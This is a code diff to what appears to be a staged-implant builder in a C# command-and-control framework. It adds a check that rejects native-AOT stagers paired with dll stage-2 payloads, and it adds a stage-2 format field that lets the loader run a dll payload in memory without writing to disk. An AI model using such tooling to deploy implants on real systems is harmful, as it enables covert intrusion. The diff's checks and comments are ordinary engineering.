@@ -103,6 +103,14 @@ public sealed class DotNetBuildUnit : IBuildUnit
         if (isStager && @params.Stage2 is null)
             throw new InvalidOperationException(
                 "A stager build requires a stage-2 payload reference (BuildParams.Stage2).");
+        // The parser refuses this pairing with a fix named; the same gate here
+        // keeps a hand-assembled BuildParams from producing an AOT loader
+        // whose baked dll stage-2 it could never host.
+        if (isStager
+            && @params.Format == ArtifactFormat.NativeAot
+            && @params.Stage2?.Format == ArtifactFormat.Dll)
+            throw new InvalidOperationException(
+                "A native-AOT stager cannot host a dll stage-2 in memory.");
 
         // The requested form decides the toolchain shape (architecture.md
         // Sec 6): the executable forms map the requested OS/arch onto a
@@ -500,6 +508,11 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["enrollURL"] = @params.Transport.Endpoint,
             ["stage2PayloadId"] = @params.Stage2.PayloadId.ToString(),
             ["stage2Sha256"] = @params.Stage2.Sha256,
+            // The fetched artifact's form factor decides the loader's run
+            // path: a dll bundle is hosted in the stager's process (no bytes
+            // on any disk), an executable form runs as the child. Same wire
+            // name as the build request, so any language's loader decodes it.
+            ["stage2Format"] = ArtifactFormats.Name(@params.Stage2.Format),
             // Empty string is the open-ended shape, same as the implant profile.
             ["killDate"] = @params.Beacon.KillDate?.ToString("O") ?? "",
         };
